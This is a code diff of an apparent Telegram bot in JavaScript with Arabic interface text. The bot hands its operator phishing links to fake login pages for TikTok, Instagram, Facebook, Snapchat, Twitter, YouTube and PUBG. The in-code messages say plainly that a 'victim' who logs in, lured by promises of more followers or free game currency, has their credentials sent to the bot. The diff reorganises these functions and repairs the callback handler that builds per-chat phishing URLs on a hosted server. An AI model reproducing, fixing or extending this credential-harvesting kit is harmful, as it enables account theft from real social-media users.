@@ -850,22 +850,6 @@ function showDefaultButtons(userId) {
   });
 }
 
-function showLoginButtons(userId) {
-  let loginButtons = [
-    [{ text: ' 🎵اندكس تسجيل دخول تيك توك 🎵 ', callback_data: 'login_tiktok' }],
-    [{ text: ' 📸اندكس تسجيل دخول انستقرام 📸', callback_data: 'login_instagram' }],
-    [{ text: ' 📘اندكس تسجيل دخول فيسبوك 📘', callback_data: 'login_facebook' }],
-    [{ text: ' 👻اندكس تسجيل دخول سناب شات 👻', callback_data: 'login_snapchat' }],
-    [{ text: ' 🐦اندكس تسجيل دخول تويتر 🐦', callback_data: 'login_twitter' }],
-  ];
-
-  bot.sendMessage(userId, `اختر اي رابط تسجيل دخول في صفحه تشبه الصفحه الحقيقه لمنصات اذا قام الضحيه بتسجيل الدخول راح توصلك المعلومات الا البوت:`, {
-    reply_markup: {
-      inline_keyboard: loginButtons
-    }
-  });
-}
-
 
 // هنا يمكنك تعريف دالة showButtons إذا كنت تحتاجها
 function showButtons(userId) {
@@ -911,27 +895,60 @@ bot.on('message', (msg) => {
     }
 });
 
+function showLoginButtons(userId) {
+  let loginButtons = [
+    [{ text: ' 🎵اندكس تسجيل دخول تيك توك 🎵 ', callback_data: 'login_tiktok' }],
+    [{ text: ' 📸اندكس تسجيل دخول انستقرام 📸', callback_data: 'login_instagram' }],
+    [{ text: ' 📘اندكس تسجيل دخول فيسبوك 📘', callback_data: 'login_facebook' }],
+    [{ text: ' 👻اندكس تسجيل دخول سناب شات 👻', callback_data: 'login_snapchat' }],
+    [{ text: ' 🐦اندكس تسجيل دخول تويتر 🐦', callback_data: 'login_twitter' }],
+  ];
+
+  bot.sendMessage(userId, `اختر اي رابط تسجيل دخول في صفحه تشبه الصفحه الحقيقه لمنصات اذا قام الضحيه بتسجيل الدخول راح توصلك المعلومات الا البوت:`, {
+    reply_markup: {
+      inline_keyboard: loginButtons
+    }
+  });
+}
+
+function showHackingButtons(userId) {
+  let hackingButtons = [
+    [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
+    [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
+    [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
+    [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
+    [{ text: '🔫 اختراق حسابات ببجي 🔫', callback_data: 'pubg_uc' }],
+    [{ text: '🔴 اختراق يوتيوب 🔴', callback_data: 'increase_youtube' }],
+    [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
+  ];
+
+  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
+    reply_markup: {
+      inline_keyboard: hackingButtons
+    }
+  });
+}
+
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
     const baseUrl = 'https://yyytot.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك
 
-    console.log('Received callback query:', data); // سجل البيانات المستلمة للتصحيح
+    console.log('Received callback query:', data);
 
     let url, message;
 
- 
-    if (action === 'login') {
+    if (data.startsWith('login_')) {
+        const platform = data.split('_')[1];
+        url = `${baseUrl}/login/${platform}/${chatId}`;
         message = `يرجى تسجيل الدخول إلى ${getPlatformName(platform)}: ${url}`;
-    } else if (action === 'increase') {
-  
-    if (data === 'pubg_uc') {
+    } else if (data === 'pubg_uc') {
         url = `${baseUrl}/increase/pubg_uc/${chatId}`;
         message = `يرجى إدخال معلومات حسابك لشحن شدات ببجي: ${url}`;
     } else if (data.startsWith('increase_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/increase/${platform}/${chatId}`;
-        message = `يرجى  ادخل معلومات حسابك لزيادة المتابعين ${getPlatformName(platform)}: ${url}`;
+        message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
     } else {
         console.log('Unhandled callback query:', data);
         message = 'عملية غير معروفة';
@@ -953,25 +970,6 @@ function getPlatformName(platform) {
         twitter: 'تويتر'
     };
     return platformNames[platform] || platform;
-}
-
-// تأكد من أن هذا الجزء موجود في الكود الخاص بإنشاء الأزرار
-function showHackingButtons(userId) {
-  let hackingButtons = [
-    [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
-    [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
-    [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
-    [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
-    [{ text: '🔫 اختراق حسابات ببجي 🔫', callback_data: 'pubg_uc' }],
-    [{ text: '🔴 اختراق يوتيوب 🔴', callback_data: 'increase_youtube' }],
-    [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
-  ];
-
-  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
-    reply_markup: {
-      inline_keyboard: hackingButtons
-    }
-  });
 }
 
 
